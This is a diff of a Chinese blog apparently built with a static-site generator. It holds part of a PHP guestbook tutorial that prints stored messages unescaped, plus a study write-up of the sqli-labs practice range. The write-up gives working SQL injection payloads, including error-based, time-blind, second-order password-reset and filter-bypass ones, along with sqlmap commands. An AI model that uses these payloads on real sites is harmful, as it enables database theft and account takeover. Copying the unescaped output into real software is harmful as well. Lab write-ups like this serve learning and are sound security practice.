class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;more&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;../bootstrap-5.1.3-dist/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;../bootstrap-5.1.3-dist/js/bootstrap.bundle.min.js&quot;</span> defer=<span class="string">&quot;defer&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-3&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6 <span class="title">border</span> <span class="title">border</span>-<span class="title">warning</span> <span class="title">border</span>-3 <span class="title">my</span>-5 <span class="title">py</span>-2 <span class="title">rounded</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                <span class="title">if</span>(<span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;]) &amp;&amp; <span class="title">is_numeric</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;]) &amp;&amp; $<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;] &gt; 0)</span></span><br><span class="line"><span class="class">                    $<span class="title">page</span> = (<span class="title">int</span>)$<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;];</span></span><br><span class="line"><span class="class">                <span class="title">else</span></span>&#123;</span><br><span class="line">                    <span class="variable">$page</span> = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;超过范围，显示首页&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">require_once</span> <span class="string">&quot;./db.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$page</span>--;</span><br><span class="line">                <span class="variable">$page</span> *= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$count</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;select count(*) from comments&quot;</span>)-&gt;fetch();</span><br><span class="line">                <span class="variable">$count</span> = (<span class="keyword">int</span>)<span class="variable">$count</span>[<span class="string">&#x27;count(*)&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$page</span> &gt;= <span class="variable">$count</span>)&#123;</span><br><span class="line">                    <span class="variable">$page</span> = (<span class="keyword">int</span>)((<span class="variable">$count</span> - <span class="number">1</span>) / <span class="number">10</span>) * <span class="number">10</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;超过范围，显示尾页&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$comments</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;select `name`, `msg`, `date` from comments order by `id` desc limit <span class="subst">$page</span>, 10&quot;</span>);</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$comments</span>) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$comments</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span>-<span class="title">striped</span>&quot; <span class="title">style</span>=&quot;<span class="title">word</span>-<span class="title">break</span>:<span class="title">break</span>-<span class="title">all</span>; <span class="title">word</span>-<span class="title">wrap</span>:<span class="title">break</span>-<span class="title">all</span>;&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">font</span>-<span class="title">monospace</span> <span class="title">fw</span>-<span class="title">light</span> <span class="title">fst</span>-<span class="title">italic</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">date</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">fs</span>-1 <span class="title">fw</span>-<span class="title">normal</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">name</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">info</span> <span class="title">rounded</span> <span class="title">fs</span>-5 <span class="title">col</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                                        &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">msg</span>&#x27;] ?&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">hr</span> /&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    &#125;</span></span><br><span class="line"><span class="class">                &#125;</span></span><br><span class="line"><span class="class">            ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2 <span class="title">text</span>-<span class="title">light</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">center</span>&quot;</span></span><br><span class="line"><span class="class">                    <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">decoration</span>: <span class="title">none</span>;&quot; </span></span><br><span class="line"><span class="class">                    <span class="title">href</span>=&quot;./<span class="title">more</span>.<span class="title">php</span>?<span class="title">page</span>=&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">intdiv</span>($<span class="title">page</span>, 10)?&gt;&quot;&gt;上一页</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    </span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-4&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                </span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2 <span class="title">text</span>-<span class="title">light</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">center</span>&quot;</span></span><br><span class="line"><span class="class">                    <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">decoration</span>: <span class="title">none</span>;&quot; </span></span><br><span class="line"><span class="class">                    <span class="title">href</span>=&quot;./<span class="title">more</span>.<span class="title">php</span>?<span class="title">page</span>=&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">intdiv</span>($<span class="title">page</span>, 10) + 2?&gt;&quot;&gt;下一页</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-3&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>效果如下</p>
-<p><img src="/images/16.png"></p>
-<p><img src="/images/17.png"></p>
+<p><img src="/images/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/16.png"></p>
+<p><img src="/images/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/17.png"></p>
 
       
     </div>
@@ -324,7 +593,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-02-09 05:11:59" itemprop="dateModified" datetime="2022-02-09T05:11:59+08:00">2022-02-09</time>
+                <time title="修改时间：2022-04-23 19:08:17" itemprop="dateModified" datetime="2022-04-23T19:08:17+08:00">2022-04-23</time>
               </span>
 
           
@@ -340,6 +609,14 @@
       
           <p>记录一下sqli-labs相关的练习</p>
 <p>具体如何判断注入点和回显点看 less-54</p>
+<hr>
+<p># 2022.4.23 增加一点简单的说明</p>
+<ol>
+<li><p>sqli-labs是一个练习sql注入的靶场，使用php制作，github地址<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
+</li>
+<li><p>本文没有配图片，纯文字（全文太长了不想配图，而且写本文的时候插入图片不熟练），搭建好sqli-labs环境后，配合使用体验更佳（或者对照sqli-labs的源码）。可以当作备忘录，遇到某种见过的类型但是忘了怎么做，可以看看</p>
+</li>
+</ol>
 <h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><p>靶场搭建在本地虚拟机上，url为 <a target="_blank" rel="noopener" href="http://game.local.com/sqli-labs-master/">http://game.local.com/sqli-labs-master/</a> （仅本地可访问）</p>
 <p>字符型，需要闭合单引号。url中 + 表示空格（url解码后 + 变为空格）如果使用 井号 需要url编码</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://game.local.com/sqli-labs-master/Less-<span class="number">1</span>/?id=&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
@@ -366,7 +643,7 @@
 
 
 
-<h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><p>和sql语句构造相关的php代码</p>
+<h1 id="less-3（括号包裹）"><a href="#less-3（括号包裹）" class="headerlink" title="less-3（括号包裹）"></a>less-3（括号包裹）</h1><p>和sql语句构造相关的php代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>‘’$id’ 用括号包裹，闭合单引号后还要闭合圆括号</p>
@@ -383,7 +660,7 @@
 
 
 
-<h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><p>此页面若是查询到数据，则会多显示出一行 <code>You are in...........</code> （不需要sql语句查询到的记录有且仅有一条，可以查询到多条记录），而且会显示sql语句的报错信息。由此想到可以使用布尔盲注或者报错注入。</p>
+<h1 id="less-5（报错注入）"><a href="#less-5（报错注入）" class="headerlink" title="less-5（报错注入）"></a>less-5（报错注入）</h1><p>此页面若是查询到数据，则会多显示出一行 <code>You are in...........</code> （不需要sql语句查询到的记录有且仅有一条，可以查询到多条记录），而且会显示sql语句的报错信息。由此想到可以使用布尔盲注或者报错注入。</p>
 <p>盲注比较麻烦，所以先使用报错注入，盲注后面应该有机会用到</p>
 <p>使用的数据库为 mysql 版本为 5.7.26</p>
 <p>给出三个可以用于mysql报错注入的sql语句，payload为user()，使用时换成自己想要的</p>
@@ -404,7 +681,7 @@
 <p>看了一眼标题，double injection ，我还以为是 二次注入 还是 二次编码</p>
 <p>网上查了一下 double injection ，有人说是因为有两个select所以叫双查询？？？</p>
 <h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1><p>同 less-5 单引号换成双引号</p>
-<h1 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h1><p>id=1时提示</p>
+<h1 id="less-7（outfile）"><a href="#less-7（outfile）" class="headerlink" title="less-7（outfile）"></a>less-7（outfile）</h1><p>id=1时提示</p>
 <figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are <span class="keyword">in</span><span class="params">...</span>. Use outfile<span class="params">...</span><span class="params">...</span></span><br></pre></td></tr></table></figure>
 
 <p>id=-1时提示</p>
@@ -464,7 +741,7 @@
 <p>有数据的表示不是使用这种引号</p>
 <p>mysql中的字符型和整型比较，有点像php的弱类型比较</p>
 <p>1 == ‘1abc’</p>
-<h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>也可以outfile</p>
+<h1 id="less-8（sqlmap-blind）"><a href="#less-8（sqlmap-blind）" class="headerlink" title="less-8（sqlmap blind）"></a>less-8（sqlmap blind）</h1><p>也可以outfile</p>
 <p>标题上面写了盲注</p>
 <p>那就试试sqlmap的布尔盲注吧</p>
 <p>我是用 pip 安装的 sqlmap，发现安装完之后在python的安装目录下的 Scripts 中有一个 sqlmap.exe ，然后这个目录又在环境变量Path中，所以可以直接  <code> sqlmap -u url</code> 而不需要 <code>python sqlmap.py -u</code> 。</p>
@@ -490,7 +767,7 @@
 
 
 
-<p>url 可以用双引号包裹，但不能用单引号，我用单引号直接提示我 invalid target URL</p>
+<p>url 可以用双引号包裹，但不能用单引号，我用单引号直接提示我 invalid target URL（运行在windows下的cmd上）</p>
 <p>生成的缓存文件的目录以单引号开头</p>
 <h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>不管id为什么，都是一样的界面。尝试基于时间的盲注。这种方法是最耗时间的</p>
 <p>判断单双引号还是整型，if函数 类似三元运算符  (1==1) ? sleep(1) : 0</p>
@@ -527,7 +804,7 @@
 
 
 
-<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>盲注</p>
+<h1 id="less-15（sqlmap-post）"><a href="#less-15（sqlmap-post）" class="headerlink" title="less-15（sqlmap post）"></a>less-15（sqlmap post）</h1><p>盲注</p>
 <p>sqlmap  get 和 post 使用方法不太一样</p>
 <p>常用的方法是 burp suite 抓个包，把http请求保存在一个文件里，然后 <code>-r &quot;&lt;path&gt;&quot;</code> 让sqlmap从文件中读取数据</p>
 <p>但我刚好不太想打开burp suite，所以试试别的方法</p>
@@ -544,7 +821,7 @@
 <p>sqlmap 布尔盲注成不了，可能是因为登录成功和登录失败最明显的就一个图片的url不一样，相差不大，sqlmap 判断不出来，虽然在浏览器里看得很明显。</p>
 <h1 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h1><p>好像就多个括号？</p>
 <p>摆了</p>
-<h1 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h1><p>注入点变了，看到修改密码觉得有update语句，然后没有token 又不验证旧密码，csrf</p>
+<h1 id="less-17（blind-amp-二次注入）"><a href="#less-17（blind-amp-二次注入）" class="headerlink" title="less-17（blind&amp;二次注入）"></a>less-17（blind&amp;二次注入）</h1><p>注入点变了，看到修改密码觉得有update语句，然后没有token 又不验证旧密码，csrf</p>
 <p>查看源代码，username必须是数据库中已有数据，否则什么信息都不给</p>
 <p>username对了之后就有报错信息，可以报错注入</p>
 <p>new password 如下时可以进行基于时间的盲注。sleep(1) 好像表示暂停10秒，不是一秒，sleep函数太多记混了（后来测试又是1秒？？不知道是什么情况，之前测试sleep(3) 等了半分钟）（之后发现可能和表中有多少列有关）</p>
@@ -570,7 +847,7 @@
 
 <p>密码随便来一个，提交后发现，所有用户密码全被改了，注入成功</p>
 <p>不过想要数据库中存在一条数据为 <code>test&#39; or 1=1#</code> 比较困难，得配合其他网页尝试插入这条数据</p>
-<h1 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h1><p>输入正常的用户名和密码，发现此网页会打印 user agent 的值，User-Agent 是http请求头的一个字段。查看源码，发现他会把 user agent 和 ip 地址插入数据库，类似一个日志功能，发生注入问题的代码如下</p>
+<h1 id="less-18（User-Agent）"><a href="#less-18（User-Agent）" class="headerlink" title="less-18（User-Agent）"></a>less-18（User-Agent）</h1><p>输入正常的用户名和密码，发现此网页会打印 user agent 的值，User-Agent 是http请求头的一个字段。查看源码，发现他会把 user agent 和 ip 地址插入数据库，类似一个日志功能，发生注入问题的代码如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
@@ -633,7 +910,7 @@
 
 
 
-<h1 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h1><p>过滤了注释符 # 和 – 。有报错信息，需要构造出一个没有语法错误的sql语句才可以使用报错注入</p>
+<h1 id="less-23（过滤注释符）"><a href="#less-23（过滤注释符）" class="headerlink" title="less-23（过滤注释符）"></a>less-23（过滤注释符）</h1><p>过滤了注释符 # 和 – 。有报错信息，需要构造出一个没有语法错误的sql语句才可以使用报错注入</p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?i</span>d=<span class="string">&#x27; or extractvalue(0x0a,concat(0x0a,(select database()))) or &#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>时间盲注</p>
@@ -657,7 +934,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;-1&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span>(<span class="string">&#x27;-1&#x27;</span>)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
 
 <p>后来又看到了 %00 截断sql语句，不知道对版本有没有什么要求</p>
-<h1 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h1><p>不知道什么原因 php文件少了几个，就先到这吧</p>
+<h1 id="less-24（二次注入）"><a href="#less-24（二次注入）" class="headerlink" title="less-24（二次注入）"></a>less-24（二次注入）</h1><p>不知道什么原因 php文件少了几个，就先到这吧</p>
 <p>未完待续。。。</p>
 <p>后来发现这关和另一关有几个文件，文件名只有首字母大小写不一样（好像就24和40），windows中文件名好像不分大小写，导致文件名重复（win10 解压时提示临时文件文件名重复了）。</p>
 <hr>
@@ -678,7 +955,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;456&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>这样就可以修改所有用户的密码，当然想要只修改一个用户的也可以做到，比如 admin，注册时用户名为 <code>admin&#39;#</code> 即可</p>
-<h1 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h1><p>过滤 and 和 or，大小写不敏感</p>
+<h1 id="less-25（过滤-and-和-or，大小写不敏感，tamper）"><a href="#less-25（过滤-and-和-or，大小写不敏感，tamper）" class="headerlink" title="less-25（过滤 and 和 or，大小写不敏感，tamper）"></a>less-25（过滤 and 和 or，大小写不敏感，tamper）</h1><p>过滤 and 和 or，大小写不敏感</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>
 
 <p>解决办法</p>
@@ -696,7 +973,7 @@
 
 
 <h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>好像就字符型换成了数字型，sqlmap使用命令与less-25相同</p>
-<h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><p>先看一眼过滤了什么</p>
+<h1 id="less-26（过滤空白、-、注释）"><a href="#less-26（过滤空白、-、注释）" class="headerlink" title="less-26（过滤空白、/**/、注释）"></a>less-26（过滤空白、/**/、注释）</h1><p>先看一眼过滤了什么</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>除了前两个（and和or），其他过滤的关键字都是放在中括号中的，表示只要有中括号中的字符就替换成空（php的正则表达式不太熟，python中应该是这样的，四个反斜杠表示替换一个反斜杠，这么多是因为要转义），所以是单字符被替换掉，无法使用双写绕过。</p>
@@ -713,7 +990,7 @@
 
 <p>盲注看26a</p>
 <p>这关过滤的是空白，不止空格，空白还包括水平制表符（\t %09）换行等</p>
-<h1 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h1><p>适用于mysql，其他dbms没怎么研究</p>
+<h1 id="绕过空白过滤"><a href="#绕过空白过滤" class="headerlink" title="绕过空白过滤"></a>绕过空白过滤</h1><p>适用于mysql，其他dbms没怎么研究</p>
 <p>用sqli-labs中的users表来举例子</p>
 <h2 id="1、用-代替"><a href="#1、用-代替" class="headerlink" title="1、用 /**/ 代替"></a>1、用 <code>/**/</code> 代替</h2><p>/* 和 */中间的内容为注释</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span>username,password<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span>username,password<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>users<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">USER</span>(),DATABASE();</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span>username,password<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>users<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(table_name),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure>
@@ -743,7 +1020,7 @@
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?i</span>d=<span class="string">&#x27;)||(if(1=1,sleep(1),0))||(&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>tamper不会写，<del>呜呜呜</del></p>
-<h1 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span 